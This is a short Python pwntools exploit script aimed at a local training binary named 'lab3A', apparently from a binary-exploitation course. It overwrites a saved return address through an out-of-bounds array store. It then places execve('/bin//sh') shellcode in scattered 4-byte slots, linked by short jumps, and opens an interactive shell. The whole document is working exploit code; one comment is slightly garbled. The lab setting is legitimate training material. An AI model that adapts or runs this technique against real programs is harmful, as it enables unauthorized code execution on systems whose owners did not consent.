from pwn import *
 
def store(p, val, idx):
  p.sendline("store")
  p.recv(100)
  p.sendline(str(val))
  p.recv(100)
  p.sendline(str(idx))
  print(p.recv(100))
 
# start up program and read inital output
p = process("./lab3A")
p.recv(1000)
 
# overwrite return address
addr = int(sys.argv[1], 16)
store(p, addr, 109)
 
# store shellcode
store(p, 0x90909090, 1)
store(p, 0x04eb9090, 2)
 
store(p, 0x90909090, 4)
store(p, 0x04eb9090, 5)
 
store(p, 0x90909090, 7)
store(p, 0x04eb9090, 8)
 
store(p, 0x90909090, 10)
store(p, 0x04eb9090, 11)
 
store(p, 0x90909090, 13)
store(p, 0x04eb9090, 14)
 
store(p, 0x9050c031, 16) # xor eax, eax; push eax
store(p, 0x04eb9090, 17)
 
store(p, 0x732f2f68, 19) # push 0x68732f2f
store(p, 0x04eb9068, 20)
 
store(p, 0x69622f68, 22) # push 0x6e69622f
store(p, 0x04eb906e, 23)
 
store(p, 0xc189e389, 25) # mov ebx, esb; mov ecx, eax; mov edx, eax
store(p, 0x04ebc289, 26)
 
store(p, 0x80cd0bb0, 28) # mov al, 0xb; int 0x80
 
p.sendline("quit")
p.interactive()